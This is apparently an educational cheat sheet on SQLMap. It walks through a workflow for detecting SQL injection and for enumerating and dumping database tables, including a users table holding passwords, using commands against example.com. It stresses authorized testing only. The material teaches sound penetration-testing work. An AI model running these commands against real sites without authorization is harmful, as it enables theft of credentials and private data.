
# SQLMap

## What is SQLMap

- **SQLMap** is an automated **SQL injection testing and exploitation tool**.
- It is used to **detect and exploit SQL injection vulnerabilities in web applications**.
- SQLMap is widely used by:
  - penetration testers
  - bug bounty hunters
  - cybersecurity researchers
  - ethical hackers
  - CTF players

SQLMap automates the process of:

- detecting SQL injection points
- extracting database data
- enumerating database structures
- bypassing authentication systems
- gaining deeper access to databases

Because of its automation and powerful detection engine, SQLMap is considered a **core tool for web application security testing**.

---

## Install SQLMap

SQLMap is usually pre-installed in **Kali Linux**.

To verify installation:

```
sqlmap --version
```

If SQLMap is not installed:

```
sudo apt install sqlmap
```

---

## Basic Syntax

Basic SQLMap command format:

```
sqlmap -u <target-url>
```

Example:

```
sqlmap -u "http://example.com/page.php?id=1"
```

SQLMap will automatically test the parameter `id` for SQL injection vulnerabilities.

---

## Test a Single URL

To test a URL for SQL injection:

```
sqlmap -u "http://example.com/page.php?id=1"
```

SQLMap will:

- test multiple SQL injection techniques
- identify vulnerable parameters
- determine the backend database

Example result:

```
parameter 'id' appears to be vulnerable
```

---

## Enumerate Databases

To list all databases on the target system:

```
sqlmap -u "http://example.com/page.php?id=1" --dbs
```

Example output:

```
available databases:
- information_schema
- users_db
- shop_db
```

This shows the **database structure available on the server**.

---

## List Tables

To list tables from a specific database:

```
sqlmap -u "http://example.com/page.php?id=1" -D users_db --tables
```

Example output:

```
Tables in users_db:
- users
- admin
- login
```

---

## List Columns

To view columns inside a table:

```
sqlmap -u "http://example.com/page.php?id=1" -D users_db -T users --columns
```

Example output:

```
Columns:
- id
- username
- password
- email
```

---

## Dump Table Data

To extract data from a table:

```
sqlmap -u "http://example.com/page.php?id=1" -D users_db -T users --dump
```

Example output:

```
username | password
admin    | admin123
user1    | password
```

This allows testers to analyze **sensitive database information**.

---

## Use Cookie

Some websites require authentication cookies.

You can provide cookies using:

```
sqlmap -u "http://example.com/page.php?id=1" --cookie="PHPSESSID=123456"
```

This helps SQLMap test **authenticated areas of the website**.

---

## POST Request Testing

To test SQL injection in POST requests:

```
sqlmap -u "http://example.com/login.php" --data="username=admin&password=123"
```

SQLMap will test the POST parameters for injection vulnerabilities.

---

## Risk and Level Options

SQLMap allows adjusting test intensity.

```
--level
--risk
```

Example:

```
sqlmap -u "http://example.com/page.php?id=1" --level=5 --risk=3
```

Explanation:

| Option | Purpose |
|------|------|
| level | number of tests performed |
| risk | potential impact of tests |

Higher values perform **more advanced testing**.

---

## Save Output

To save results to a file:

```
sqlmap -u "http://example.com/page.php?id=1" --dump -o
```

SQLMap automatically saves extracted data inside:

```
~/.local/share/sqlmap/output/
```

---

## Batch Mode

To run SQLMap without interactive prompts:

```
sqlmap -u "http://example.com/page.php?id=1" --batch
```

This is useful for **automation and scripting**.

---

## Simple Workflow

Typical SQL injection testing workflow:

### Step 1 — Identify Parameter

Example target:

```
http://example.com/page.php?id=1
```

---

### Step 2 — Test Vulnerability

```
sqlmap -u "http://example.com/page.php?id=1"
```

---

### Step 3 — Enumerate Databases

```
sqlmap -u "http://example.com/page.php?id=1" --dbs
```

---

### Step 4 — Extract Tables

```
sqlmap -u "http://example.com/page.php?id=1" -D users_db --tables
```

---

### Step 5 — Dump Data

```
sqlmap -u "http://example.com/page.php?id=1" -D users_db -T users --dump
```

---

## Use Cases

SQLMap is commonly used for:

- SQL injection testing
- database enumeration
- credential extraction in labs
- vulnerability verification
- penetration testing
- bug bounty research
- CTF challenges

---

## Best Practice

SQL injection testing should only be performed in **authorized environments**.

Safe platforms to practice:

- TryHackMe
- Hack The Box
- PortSwigger Web Security Academy
- OWASP Juice Shop
- CTF competitions

Never test SQL injection on systems **without permission**.

---

## Summary

SQLMap is one of the **most powerful automated SQL injection testing tools**.

It allows security professionals to:

- detect SQL injection vulnerabilities
- extract database information
- automate exploitation processes
- test web application security

Learning SQLMap is an essential skill for anyone pursuing **web penetration testing and bug bounty hunting**.


<div style="background: #1f3327; border-radius: 8px; padding: 18px; margin: 20px 0; border-left: 5px solid #3ddc84; color: #e6e6e6;">
<strong>✔ Learning Tip</strong><br><br>
Break complex topics into smaller parts. Learn one concept at a time instead of trying to master everything at once.
</div>